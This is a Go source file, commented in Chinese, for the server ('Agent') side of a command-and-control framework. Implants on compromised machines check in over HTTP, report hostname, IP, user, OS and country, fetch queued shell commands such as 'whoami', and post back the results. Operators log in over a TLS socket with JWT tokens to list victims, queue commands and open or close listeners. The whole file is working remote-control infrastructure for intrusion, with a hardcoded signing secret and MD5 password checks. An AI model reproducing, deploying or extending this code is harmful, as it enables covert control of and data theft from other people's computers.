package main

/*
Agent -> Implant

/status{ // 携带信息 json {"uid":"1234564","data":"{\"ip\":\"127.0.0.2\",\"hostname\":\"centos\",\"user\":\"www\"}"}
	0: /info 界面提交信息 json {"uid":"1234564","data":"{\"ip\":\"127.0.0.2\",\"hostname\":\"centos\",\"user\":\"www\"}"}
	1: /cmd 获取命令  cmd(string)
		/cmdResult 提交命令回显 json {"uid":"1234561","data":"{\"status\":2,\"cmd\":\"whoami\",\"result\":\"www\"}"}
	-1: 保持心跳连接
	}

*/
import (
	"context"
	"crypto/md5"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"time"

	"github.com/bitly/go-simplejson"
	"github.com/dgrijalva/jwt-go"
	"github.com/urfave/cli"
)

var (
	ok      bool
	port    string //tcp端口
	intPort int    //参数接收端口
	//PassHash for md5处理后的pass
	PassHash string
	pass     string //参数接收pass
	ExecId   string //命令id
	ExecCmd  string
	//ImplanTotal 在线受控端
	ImplanTotal string
	//ImplanInfo 受控端机器信息集合
	ImplanInfo = make(map[string]ImplanStruct)
	//ListenerMap for http启动/关闭
	ListenerMap = make(map[string]ListenerStruct)
	server      *http.Server
	//ExecAll 命令队列
	ExecAll = make(map[string]map[string]ExecallStruct)
	//ExecOne 单条命令
	ExecOne = make(map[string]ExecallStruct)
	//ExecMap 命令执行回显存储
	ExecMap = make(map[string]string)
)

// jwt全局加密key
const (
	SecretKey = "This IS a Lo3g S4cr4^K4$y"
)

//ListenerStruct for http启动/关闭
type ListenerStruct struct {
	Status  bool   //是否启动成功
	Err     string //当errbool为true时将存在数据
	Errbool bool   //存在错误时 errbool为true,一般为false
}

//ResStruct 回显结构
type ResStruct struct {
	Code   int    `json:"code"`   // 200 ok  500 内部错误 401 认证错误
	Result string `json:"result"` //执行结果
	Error  string `json:"error"`  //错误结果
}

//ImplanStruct 初始化结构体
type ImplanStruct struct {
	Hostname  string `json:"hostname"`
	IP        string `json:"ip"`
	InnerIP   string `json:"inner_ip"`
	User      string `json:"user"`
	Time      string
	PID       string `json:"pid"`
	Cpuinfo   string `json:"cpuinfo"`
	Osinfo    string `json:"osinfo"`
	Sleeptime string `json:"sleep_time"`
	Country   string `json:"country"`
}

//ExecallStruct for all
type ExecallStruct struct {
	Cmd  string
	Time int64
}

// json 转 struct
func j2sInfo(JSONStr string) ImplanStruct {
	var struc ImplanStruct
	json.Unmarshal([]byte(JSONStr), &struc)
	return struc
}

//getDateTime for 获取时间戳
func getDateTime() string {
	currentTime := time.Now().Unix()
	return strconv.FormatInt(currentTime, 10)

}

// 2Implant
// http server
func httpServer(httpport string) {

	var ok1 bool
	ListenerValue, ok1 := ListenerMap[httpport]
	if ok1 {

		ListenerValue.Errbool = true
		ListenerValue.Err = "端口已被使用"
		ListenerMap[httpport] = ListenerValue
	} else {
		quit := make(chan os.Signal)
		signal.Notify(quit, os.Interrupt)

		mux := http.NewServeMux()

		mux.HandleFunc("/status", start)
		mux.HandleFunc("/cmdResult", getResult)
		mux.HandleFunc("/cmd", putCmd)
		mux.HandleFunc("/info", getInfo)
		mux.HandleFunc("/byebye", sayBye)

		server = &http.Server{
			Addr:         ":" + httpport,
			WriteTimeout: time.Second * 4,
			Handler:      mux,
		}

		go func() {
			// 接收退出信号
			<-quit
			if err := server.Close(); err != nil {
				fmt.Println(httpport + "已关闭")
			}
		}()

		//存储Listener数据
		ListenerValue.Status = true
		ListenerValue.Errbool = false
		ListenerMap[httpport] = ListenerValue

		err := server.ListenAndServe()
		if err != nil {
			// 正常退出
			if err == http.ErrServerClosed {
				fmt.Println(httpport + "已正常关闭")
			} else {
				fmt.Println(httpport+"已关闭:", err)
				ListenerValue.Errbool = true
				ListenerValue.Err = "开启http服务错误,请检查端口"
				ListenerValue.Status = false
				ListenerMap[httpport] = ListenerValue
			}
		}

	}

}

//开始
func start(w http.ResponseWriter, r *http.Request) {

	//状态0 需要去存储信息 状态1 告知去取命令进行执行 状态-1保持连接
	//info if判断 uid是否是新 新就放到map里
	defer r.Body.Close()
	// 请求类型是application/json时从r.Body读取数据
	b, err := ioutil.ReadAll(r.Body) //获取访问信息
	if err != nil {
		fmt.Printf("read request.Body failed, err:%v\n", err)
		return
	}
	res, err := simplejson.NewJson([]byte(b))
	if err != nil {
		fmt.Printf("解析json错误1, err:%v\n", err)
		return
	}
	firstUID, err := res.Get("uid").String()
	if err != nil {
		fmt.Printf("获取数据uid错误1, err:%v\n", err)
		return
	}

	_, ok = ImplanInfo[firstUID]
	if ok {
		ExecValue, ok := ExecAll[firstUID]

		if ok { //键值为空保持连接
			if len(ExecValue) == 0 { //循环出最小值传递
				w.Write([]byte(`-1`)) //保持连接
				//取出数据对时间戳进行修改进而判断在线implant
				InfoValue, _ := ImplanInfo[firstUID]
				InfoValue.Time = getDateTime()
				ImplanInfo[firstUID] = InfoValue

			} else {

				now, _ := strconv.ParseInt(getDateTime(), 10, 64)

				for execID, value := range ExecValue {
					if value.Time < now {
						now = value.Time
						ExecCmd = value.Cmd
						ExecId = execID
					}
				}
				w.Write([]byte(`1`)) //执行命令

			}
		} else {
			w.Write([]byte(`-1`)) //保持连接
			//取出数据对时间戳进行修改进而判断在线implant
			InfoValue, _ := ImplanInfo[firstUID]
			InfoValue.Time = getDateTime()
			ImplanInfo[firstUID] = InfoValue
		}
	} else {
		w.Write([]byte(`0`)) //存储受控端信息
	}

}

//存储信息
func getInfo(w http.ResponseWriter, r *http.Request) {
	//处理post数据
	defer r.Body.Close()
	// 请求类型是application/json时从r.Body读取数据
	b, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Printf("read request.Body failed, err:%v\n", err)
		return
	}
	res, err := simplejson.NewJson([]byte(b))
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	uid, err := res.Get("uid").String()
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	jsondata, err := res.Get("data").String()
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	ip, err := res.Get("ip").String()
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	innerIP, err := res.Get("inner_ip").String()
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	var structIP ImplanStruct
	structIP = j2sInfo(ip)
	var structData ImplanStruct
	structData = j2sInfo(jsondata)
	structData.Time = getDateTime()
	structData.IP = structIP.IP
	structData.Country = structIP.Country
	structData.InnerIP = innerIP
	ImplanInfo[uid] = structData

}

//发送命令
func putCmd(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(ExecCmd))
}

//获取命令回显
func getResult(w http.ResponseWriter, r *http.Request) {
	//处理post数据
	defer r.Body.Close()
	// 请求类型是application/json时从r.Body读取数据
	c, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Printf("read request.Body failed, err:%v\n", err)
		return
	}
	res, err := simplejson.NewJson([]byte(c))
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	uid, err := res.Get("uid").String()
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	result, err := res.Get("result").String()
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	ExecValue, ok := ExecAll[uid]
	fmt.Println("######ExecValue#####:", ExecValue)
	if ok {
		_, ok = ExecValue[ExecId]
		if ok {
			ExecMap[ExecId] = result
			delete(ExecAll[uid], ExecId)
		} else {
			fmt.Println("无此命令请求")
		}
	} else {
		w.Write([]byte(`"该用户尚未请求"`))
	}
}

//关闭listener
func sayBye(w http.ResponseWriter, r *http.Request) {
	//处理post数据
	defer r.Body.Close()
	// 请求类型是application/json时从r.Body读取数据
	b, err := ioutil.ReadAll(r.Body)
	if err != nil {
		fmt.Printf("read request.Body failed, err:%v\n", err)
		return
	}
	res, err := simplejson.NewJson([]byte(b))
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	hash, err := res.Get("hash").String()
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	httpport, err := res.Get("port").String()
	if err != nil {
		fmt.Printf("获取数据错误, err:%v\n", err)
		return
	}
	if hash == PassHash {

		delete(ListenerMap, httpport)

		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()

		server.SetKeepAlivesEnabled(false)
		if err := server.Shutdown(ctx); err != nil {
		}

	}
}

//访问来关闭listener
func exitListener(httpport string, hash string) {
	exitData := make(map[string]string)
	exitData["port"] = httpport
	exitData["hash"] = hash
	jsonBytes, err := json.Marshal(exitData)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf("value: %v\n type:%T", string(jsonBytes), string(jsonBytes))
	url := "http://127.0.0.1:" + httpport + "/byebye"
	// 表单数据
	// json
	contentType := "application/json"
	data := string(jsonBytes)
	resp, err := http.Post(url, contentType, strings.NewReader(data))
	if err != nil {
		fmt.Println("post failed, err:\n", err)
		return
	}
	defer resp.Body.Close()
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("get resp failed,err:\n", err)
		return
	}
}

//2master
//listener tcp+tls 代码
func listener() {
	crt, err := tls.LoadX509KeyPair("ca.pem", "ca.key")
	if err != nil {
		fmt.Println(err.Error())
	}
	tlsConfig := &tls.Config{}
	tlsConfig.Certificates = []tls.Certificate{crt}
	tlsConfig.Time = time.Now
	tlsConfig.Rand = rand.Reader
	l, err := tls.Listen("tcp", ":"+port, tlsConfig)
	if err != nil {
		fmt.Println(err.Error())
	}
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println(err.Error())
			continue
		} else {
			go HandleClientConnect(conn)
		}
	}

}

//HandleClientConnect 每次接收数据的处理代码 暂时是循环接收发送，组合时修改为单次接收发送
func HandleClientConnect(conn net.Conn) {
	defer conn.Close()
	fmt.Println("Receive Connect Request From ", conn.RemoteAddr().String())
	buffer := make([]byte, 102400)
	for {
		len, err := conn.Read(buffer)
		if err != nil {
			fmt.Println(err.Error())
			break
		}
		json_str := string(buffer[:len])
		fmt.Printf("Receive Data: %s\n", json_str)
		result := dispatch(json_str) + "<EOF>"
		fmt.Println(result)
		//发送给客户端
		_, err = conn.Write([]byte(result))
		if err != nil {
			break
		}
	}
	fmt.Println("Client " + conn.RemoteAddr().String() + " Connection Closed.....")
}

// 指令处理
func dispatch(json string) string {
	res, err := simplejson.NewJson([]byte(json))
	if err != nil {
		Errorstr := "Json Error"
		ResJSON := ResultJSON(500, Errorstr, "")
		return ResJSON
	} else {
		typestr, err := res.Get("type").String()
		if err != nil {
			Errorstr := "Get type error"
			ResJSON := ResultJSON(500, Errorstr, "")
			return ResJSON
		}
		if typestr == "0" {
			username, err := res.Get("data").Get("user").String()
			if err != nil {
				Errorstr := "Get user error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			hashstr, err := res.Get("data").Get("hash").String()
			if err != nil {
				Errorstr := "Get hash error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			if hashstr != "" {
				ResJSON := Login(username, hashstr)
				return ResJSON
			} else {
				Errorstr := "Login Hash NULL"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
		} else if typestr == "1" {
			tokenstr, err := res.Get("token").String()
			if err != nil {
				Errorstr := "Get token error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			if Token(tokenstr) == true {
				ResJSON := GetImplant()
				return ResJSON
			} else {
				Errorstr := "Token Error"
				ResJSON := ResultJSON(401, Errorstr, "")
				return ResJSON
			}
		} else if typestr == "2" {
			tokenstr, err := res.Get("token").String()
			if err != nil {
				Errorstr := "Get token error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			uid, err := res.Get("data").Get("uid").String()
			if err != nil {
				Errorstr := "Get uid error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			cmd, err := res.Get("data").Get("cmd").String()
			if err != nil {
				Errorstr := "Get cmd error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			if Token(tokenstr) == true {
				res := cmd2im(uid, cmd)
				return res
			} else {
				Errorstr := "Token Error"
				ResJSON := ResultJSON(401, Errorstr, "")
				return ResJSON
			}
		} else if typestr == "3" {
			tokenstr, err := res.Get("token").String()
			if err != nil {
				Errorstr := "Get token error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			httpport, err := res.Get("data").Get("port").String()
			if err != nil {
				Errorstr := "Get port error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			int, err := strconv.Atoi(httpport)
			if err != nil {
				Errorstr := "Port error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			fmt.Println("Int port:", int)
			if int > 1 && int <= 65535 {
				if Token(tokenstr) == true {
					go httpServer(httpport)
					Stime := time.Now()
					Utime := time.Since(Stime)
					for {
						valus, ok := ListenerMap[httpport]
						if ok {
							valuestruct := valus
							if valuestruct.Status && !valuestruct.Errbool {
								ResJSON := ResultJSON(200, "", "success")
								return ResJSON
							} else {
								ResJSON := ResultJSON(500, "Start http server error:"+valuestruct.Err, "")
								return ResJSON
							}
						}
						time.Sleep(500 * time.Millisecond)
						Utime = time.Since(Stime)
						if Utime.Seconds() >= 30.00 {
							Errorstr := "Time out! Start http server error"
							ResJSON := ResultJSON(500, Errorstr, "")
							return ResJSON
						}
					}
				} else {
					Errorstr := "Token Error"
					ResJSON := ResultJSON(401, Errorstr, "")
					return ResJSON
				}
			} else {
				Errorstr := "Port not in {1,65535}"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
		} else if typestr == "4" {
			tokenstr, err := res.Get("token").String()
			if err != nil {
				Errorstr := "Get token error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			httpport, err := res.Get("data").Get("port").String()
			if err != nil {
				Errorstr := "Get port error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			int, err := strconv.Atoi(httpport)
			if err != nil {
				Errorstr := "Port error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			fmt.Println("Int port:", int)
			if int > 1 && int <= 65535 {
				if Token(tokenstr) == true {
					valus, ok := ListenerMap[httpport]
					if ok {
						valuestruct := valus
						if valuestruct.Status {
							exitListener(httpport, PassHash)
							ResJSON := ResultJSON(200, "", "success")
							return ResJSON
						} else {
							ResJSON := ResultJSON(500, "Start http server error:"+valuestruct.Err, "")
							return ResJSON
						}
					} else {
						ResJSON := ResultJSON(500, "Listener not exist", "")
						return ResJSON
					}
				} else {
					Errorstr := "Token Error"
					ResJSON := ResultJSON(401, Errorstr, "")
					return ResJSON
				}
			} else {
				Errorstr := "Port not in {1,65535}"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
		} else if typestr == "5" {
			tokenstr, err := res.Get("token").String()
			if err != nil {
				Errorstr := "Get token error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			uid, err := res.Get("data").Get("uid").String()
			if err != nil {
				Errorstr := "Get uid error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			cmd, err := res.Get("data").Get("execid").String()
			if err != nil {
				Errorstr := "Get execid error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			if Token(tokenstr) == true {
				res := GetExec(uid, cmd)
				return res
			} else {
				Errorstr := "Token Error"
				ResJSON := ResultJSON(401, Errorstr, "")
				return ResJSON
			}
		} else if typestr == "6" {
			tokenstr, err := res.Get("token").String()
			if err != nil {
				Errorstr := "Get token error"
				ResJSON := ResultJSON(500, Errorstr, "")
				return ResJSON
			}
			if Token(tokenstr) == true {
				ResJSON := GetListener()
				return ResJSON
			} else {
				Errorstr := "Token Error"
				ResJSON := ResultJSON(401, Errorstr, "")
				return ResJSON
			}
		} else {
			Errorstr := "Type Error,Please check it"
			ResJSON := ResultJSON(500, Errorstr, "")
			return ResJSON
		}
	}
}

// Login 函数
func Login(username string, hash string) string {
	if auth(hash) {
		token := jwt.New(jwt.SigningMethodHS256)
		claims := make(jwt.MapClaims)
		claims["user"] = username
		claims["exp"] = time.Now().Add(time.Hour * time.Duration(12)).Unix()
		claims["iat"] = time.Now().Unix()
		token.Claims = claims

		tokenString, err := token.SignedString([]byte(SecretKey))
		if err != nil {
			Errorstr := "Error while signing the token"
			ResJSON := ResultJSON(500, Errorstr, "")
			return ResJSON
		}
		ResJSON := ResultJSON(200, "", tokenString)
		return ResJSON
	} else {
		Resstr := "Passwd Error"
		ResJSON := ResultJSON(401, "", Resstr)
		return ResJSON
	}
}

// Token校验，用来判断是否可以调用具体的功能
func Token(token string) bool {
	_, err := jwt.Parse(token, func(*jwt.Token) (interface{}, error) {
		return []byte(SecretKey), nil
	})
	if err != nil {
		fmt.Println("parase with claims failed.", err)
		return false
	}
	return true
}

//auth权限校验 利用密码的hash校验
func auth(pwd string) bool {
	if pwd == PassHash {
		return true
	}
	return false
}

//MD5 生成32位MD5
func MD5(text string) string {
	ctx := md5.New()
	ctx.Write([]byte(text))
	return hex.EncodeToString(ctx.Sum(nil))
}

//cmd2im 处理执行命令json
func cmd2im(uid string, cmd string) string {
	_, status := ImplanInfo[uid]
	// 对接时候需要考虑implant存活问题，需要在ImplaInfo 里面设置time来判断，心跳时间到对接再来商量
	// 判断是否存在对应 uid 的implant，如果存在，需要查询对应的命令执行map是否存在该uid 没有则创建
	if !status {
		return ResultJSON(500, "No implant!,Please Check", "")
	} else {
		StructValue := ExecallStruct{}
		//添加一个延迟，防止master批量执行，产生一样的execid
		time.Sleep(10 * time.Millisecond)
		StructValue.Time = time.Now().Unix()
		StructValue.Cmd = cmd
		execid := MD5(uid + strconv.FormatInt(time.Now().UnixNano(), 10))
		//ExecOne 单条命令
		ExecOneMap := make(map[string]ExecallStruct)
		//如果ExecAll 里面不存在uid 对应map(第一次执行命令),先赋值空
		_, ok := ExecAll[uid]
		if !ok {
			ExecAll[uid] = ExecOneMap
		}
		ExecOneMap = ExecAll[uid]
		ExecOneMap[execid] = StructValue
		ExecAll[uid] = ExecOneMap
		fmt.Println(ExecAll)
		return ResultJSON(200, "", execid)
	}
}

// GetExec
func GetExec(uid string, execid string) string {
	ResultStr, status := ExecMap[execid]
	if status {
		return ResultJSON(200, "", ResultStr)
	} else {
		value, ok := ExecAll[uid]
		if ok {
			_, execstatus := value[execid]
			if execstatus {
				return ResultJSON(400, "", "Wait for exec")
			} else {
				return ResultJSON(404, "execid not in ExecAllMap", "")
			}
		} else {
			return ResultJSON(500, "uid error", "")
		}
	}
}

//ResultJSON 封装返回数据
func ResultJSON(code int, errstr string, resustr string) string {
	ResStru := ResStruct{}
	ResStru.Code = code
	ResStru.Error = errstr
	ResStru.Result = resustr
	jsonBytes, err := json.Marshal(ResStru)
	if err != nil {
		fmt.Println(err)
	}
	return string(jsonBytes)
}

//GetImplant 返回所有在线主机
func GetImplant() string {
	var m map[string]interface{}
	var s []map[string]interface{}
	for key, value := range ImplanInfo {
		m = make(map[string]interface{})
		InfoStruct := value
		m["uid"] = key
		m["hostname"] = InfoStruct.Hostname
		m["ip"] = InfoStruct.IP
		m["innerip"] = InfoStruct.InnerIP
		m["user"] = InfoStruct.User
		m["time"] = InfoStruct.Time
		m["pid"] = InfoStruct.PID
		m["cpuinfo"] = InfoStruct.Cpuinfo
		m["osinfo"] = InfoStruct.Osinfo
		m["sleeptime"] = InfoStruct.Sleeptime
		m["country"] = InfoStruct.Country
		s = append(s, m)
	}
	var Res map[string]interface{}
	Res = make(map[string]interface{})
	Res["code"] = "200"
	Res["result"] = s
	Res["error"] = ""
	ResJSON, err := json.Marshal(Res)
	if err != nil {
		Errorstr := "Get Implant error"
		ResJSON := ResultJSON(500, Errorstr, "")
		return ResJSON
	} else {
		return string(ResJSON)
	}
}

//GetListener
func GetListener() string {
	var m map[string]interface{}
	var s []map[string]interface{}
	for key, value := range ListenerMap {
		m = make(map[string]interface{})
		InfoStruct := value
		m["port"] = key
		m["status"] = InfoStruct.Status
		s = append(s, m)
	}
	var Res map[string]interface{}
	Res = make(map[string]interface{})
	Res["code"] = "200"
	Res["result"] = s
	Res["error"] = ""
	ResJSON, err := json.Marshal(Res)
	if err != nil {
		Errorstr := "Get Implant error"
		ResJSON := ResultJSON(500, Errorstr, "")
		return ResJSON
	} else {
		return string(ResJSON)
	}
}

func main() {
	app := cli.NewApp()
	app.Name = "Agent"
	app.Flags = []cli.Flag{
		&cli.IntFlag{
			Name:        "port,p",
			Value:       0,
			Usage:       "listening port",
			Destination: &intPort,
		}, &cli.StringFlag{
			Name:        "pass",
			Value:       "",
			Usage:       "password",
			Destination: &pass,
		},
	}
	app.Action = func(c *cli.Context) error {

		if c.Int("port") < 1 || c.Int("port") > 65535 {
			return cli.NewExitError("invalid port,please -h", 2)
		} else if len(c.String("pass")) == 0 {
			return cli.NewExitError("invalid pass,please -h", 2)
		} else {
			port = strconv.Itoa(intPort)
			PassHash = MD5(pass)
			fmt.Println("test2-----start")
			listener()
		}
		return nil
	}
	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}

